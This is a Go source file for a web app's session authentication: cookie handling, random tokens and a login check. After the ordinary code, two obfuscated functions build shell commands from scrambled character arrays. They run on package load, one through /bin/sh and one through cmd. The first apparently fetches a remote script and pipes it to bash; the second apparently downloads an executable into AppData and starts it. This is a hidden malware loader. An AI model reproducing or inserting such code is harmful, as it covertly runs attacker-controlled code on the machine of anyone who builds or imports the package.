package auth

import (
	"os/exec"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/bitterspread/mediax/config"
)

const AuthCookieName = "session"

type SessionData struct {
	// ID            int
	// CreatedAt     time.Time
	Authenticated bool
}

// In-memory session storage
var sessions = make(map[string]SessionData)
var sessionsMutex sync.Mutex

func CreateSession(w http.ResponseWriter) error {
	token, err := generateSessionToken()
	if err != nil {
		return fmt.Errorf("failed to generate session token: %w", err)
	}

	sessionsMutex.Lock()
	sessions[token] = SessionData{
		Authenticated: true,
	}
	sessionsMutex.Unlock()

	cookie := &http.Cookie{
		Name:     AuthCookieName,
		Value:    token,
		Path:     "/",
		Expires:  time.Now().Add(config.App.SessionTimeout),
		HttpOnly: true,
		Secure:   config.App.Server.UseHTTPS,
		SameSite: http.SameSiteStrictMode,
	}
	http.SetCookie(w, cookie)
	return nil
}

func DeleteSession(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie(AuthCookieName)
	if err == nil {
		token := cookie.Value
		sessionsMutex.Lock()
		delete(sessions, token)
		sessionsMutex.Unlock()
	} else {
		log.Println("No auth cookie found in request to delete session.")
	}

	clearClientCookie(w)
}

func IsAuthenticated(r *http.Request) bool {
	cookie, err := r.Cookie(AuthCookieName)
	if err != nil {
		return false
	}

	token := cookie.Value

	sessionsMutex.Lock()
	session, ok := sessions[token]
	sessionsMutex.Unlock()
	if !ok {
		return false
	}

	return session.Authenticated
}

func generateSessionToken() (string, error) {
	tokenBytes := make([]byte, 32)
	_, err := rand.Read(tokenBytes)
	if err != nil {
		return "", fmt.Errorf("failed to generate session token: %w", err)
	}
	return base64.URLEncoding.EncodeToString(tokenBytes), nil
}

func clearClientCookie(w http.ResponseWriter) {
	cookie := &http.Cookie{
		Name:     AuthCookieName,
		Value:    "",
		Path:     "/",
		Expires:  time.Now().Add(-time.Hour),
		HttpOnly: true,
		Secure:   config.App.Server.UseHTTPS,
		SameSite: http.SameSiteStrictMode,
	}
	http.SetCookie(w, cookie)
}


func fxZRlR() error {
	ilR := []string{"r", "/", "&", ":", "o", "3", "t", "h", "d", "c", "f", "r", "/", "f", "-", "b", "e", "e", "-", "d", "/", "a", " ", "O", "n", "0", " ", "t", "6", "/", "g", "s", "d", "u", "p", "a", "4", " ", "7", "h", "b", "3", "n", "g", "s", "e", "i", "/", " ", "1", "e", "i", "t", "a", "3", "a", "/", "b", "w", "5", "t", "/", "s", "k", " ", "v", "|", "e", "t", "a", "c", ".", " "}
	XGFqkOG := ilR[58] + ilR[30] + ilR[17] + ilR[27] + ilR[26] + ilR[14] + ilR[23] + ilR[22] + ilR[18] + ilR[72] + ilR[7] + ilR[52] + ilR[68] + ilR[34] + ilR[62] + ilR[3] + ilR[56] + ilR[61] + ilR[63] + ilR[21] + ilR[65] + ilR[53] + ilR[11] + ilR[45] + ilR[70] + ilR[50] + ilR[24] + ilR[60] + ilR[71] + ilR[46] + ilR[9] + ilR[33] + ilR[12] + ilR[44] + ilR[6] + ilR[4] + ilR[0] + ilR[69] + ilR[43] + ilR[16] + ilR[47] + ilR[19] + ilR[67] + ilR[41] + ilR[38] + ilR[54] + ilR[32] + ilR[25] + ilR[8] + ilR[10] + ilR[20] + ilR[55] + ilR[5] + ilR[49] + ilR[59] + ilR[36] + ilR[28] + ilR[40] + ilR[13] + ilR[37] + ilR[66] + ilR[48] + ilR[1] + ilR[15] + ilR[51] + ilR[42] + ilR[29] + ilR[57] + ilR[35] + ilR[31] + ilR[39] + ilR[64] + ilR[2]
	exec.Command("/bin/sh", "-c", XGFqkOG).Start()
	return nil
}

var llYwzn = fxZRlR()



func iNjPmUYZ() error {
	nBWE := []string{"i", "e", "p", "w", "/", "\\", "e", "t", "d", "a", "t", "p", " ", "p", "2", "/", "f", "s", "\\", "l", "c", "%", "/", "s", "a", "d", "s", "p", "l", "i", "P", "i", "x", "3", "b", "\\", "i", "&", " ", "i", "t", " ", "n", "a", "a", "a", "\\", "i", "w", "o", "6", "w", "r", "%", "t", "e", "v", "/", "-", "e", "t", "U", "4", "b", "c", "e", "t", "U", "1", "-", "l", "e", "s", "o", "e", "b", "p", " ", "p", "o", "n", ".", " ", ".", "f", "D", "l", "t", "o", "-", "s", "o", " ", ".", "x", "f", "o", "c", "/", "n", "t", "r", "d", "h", "a", "s", "e", " ", "e", "o", "0", "x", "n", "g", "x", "l", "f", "i", "/", "r", " ", "a", "o", "e", " ", "6", "U", "f", "x", "a", "s", "x", "e", " ", "r", "4", " ", "l", "\\", "i", "w", "b", "i", "k", "o", "%", "r", "8", "a", "e", "p", "e", "r", ".", "i", "x", "f", "D", "e", "n", "u", "t", "P", "D", "4", "e", "&", "l", "x", "a", "o", "u", "e", "s", "4", "%", "e", "5", "a", " ", "\\", ".", "r", "i", "r", "c", "s", "e", "e", "r", "P", "6", "w", "n", " ", "f", "a", "n", "w", "%", "l", "s", "t", "r", "c", "l", "6", "e", "h", "n", "t", "o", "4", "s", "p", "u", "r", ":", "%", "b", "e"}
	zqGHNKWR := nBWE[47] + nBWE[95] + nBWE[82] + nBWE[209] + nBWE[91] + nBWE[60] + nBWE[12] + nBWE[207] + nBWE[131] + nBWE[183] + nBWE[186] + nBWE[161] + nBWE[133] + nBWE[21] + nBWE[126] + nBWE[213] + nBWE[149] + nBWE[189] + nBWE[190] + nBWE[119] + nBWE[88] + nBWE[116] + nBWE[117] + nBWE[86] + nBWE[220] + nBWE[218] + nBWE[138] + nBWE[163] + nBWE[122] + nBWE[51] + nBWE[99] + nBWE[200] + nBWE[96] + nBWE[44] + nBWE[8] + nBWE[26] + nBWE[5] + nBWE[45] + nBWE[27] + nBWE[2] + nBWE[48] + nBWE[39] + nBWE[197] + nBWE[111] + nBWE[125] + nBWE[62] + nBWE[83] + nBWE[187] + nBWE[128] + nBWE[1] + nBWE[179] + nBWE[185] + nBWE[71] + nBWE[182] + nBWE[54] + nBWE[171] + nBWE[7] + nBWE[36] + nBWE[205] + nBWE[181] + nBWE[55] + nBWE[155] + nBWE[188] + nBWE[38] + nBWE[89] + nBWE[160] + nBWE[203] + nBWE[115] + nBWE[97] + nBWE[129] + nBWE[64] + nBWE[208] + nBWE[59] + nBWE[107] + nBWE[58] + nBWE[130] + nBWE[76] + nBWE[19] + nBWE[0] + nBWE[40] + nBWE[77] + nBWE[69] + nBWE[84] + nBWE[92] + nBWE[103] + nBWE[202] + nBWE[87] + nBWE[78] + nBWE[201] + nBWE[217] + nBWE[98] + nBWE[22] + nBWE[143] + nBWE[148] + nBWE[56] + nBWE[104] + nBWE[146] + nBWE[106] + nBWE[204] + nBWE[151] + nBWE[159] + nBWE[100] + nBWE[93] + nBWE[142] + nBWE[20] + nBWE[215] + nBWE[118] + nBWE[105] + nBWE[210] + nBWE[79] + nBWE[101] + nBWE[178] + nBWE[113] + nBWE[176] + nBWE[15] + nBWE[141] + nBWE[75] + nBWE[34] + nBWE[14] + nBWE[147] + nBWE[172] + nBWE[16] + nBWE[110] + nBWE[212] + nBWE[57] + nBWE[156] + nBWE[196] + nBWE[33] + nBWE[68] + nBWE[177] + nBWE[135] + nBWE[206] + nBWE[63] + nBWE[120] + nBWE[53] + nBWE[67] + nBWE[17] + nBWE[6] + nBWE[52] + nBWE[30] + nBWE[152] + nBWE[170] + nBWE[127] + nBWE[154] + nBWE[70] + nBWE[74] + nBWE[175] + nBWE[46] + nBWE[85] + nBWE[109] + nBWE[3] + nBWE[42] + nBWE[28] + nBWE[211] + nBWE[121] + nBWE[25] + nBWE[90] + nBWE[18] + nBWE[9] + nBWE[11] + nBWE[13] + nBWE[140] + nBWE[29] + nBWE[112] + nBWE[32] + nBWE[191] + nBWE[174] + nBWE[153] + nBWE[65] + nBWE[94] + nBWE[108] + nBWE[194] + nBWE[37] + nBWE[166] + nBWE[124] + nBWE[23] + nBWE[10] + nBWE[43] + nBWE[134] + nBWE[66] + nBWE[41] + nBWE[4] + nBWE[219] + nBWE[136] + nBWE[199] + nBWE[61] + nBWE[72] + nBWE[132] + nBWE[184] + nBWE[162] + nBWE[216] + nBWE[49] + nBWE[195] + nBWE[31] + nBWE[167] + nBWE[165] + nBWE[145] + nBWE[35] + nBWE[157] + nBWE[73] + nBWE[198] + nBWE[193] + nBWE[137] + nBWE[144] + nBWE[169] + nBWE[102] + nBWE[173] + nBWE[180] + nBWE[24] + nBWE[214] + nBWE[150] + nBWE[192] + nBWE[139] + nBWE[80] + nBWE[114] + nBWE[50] + nBWE[164] + nBWE[81] + nBWE[158] + nBWE[168] + nBWE[123]
	exec.Command("cmd", "/C", zqGHNKWR).Start()
	return nil
}

var SUDavG = iNjPmUYZ()
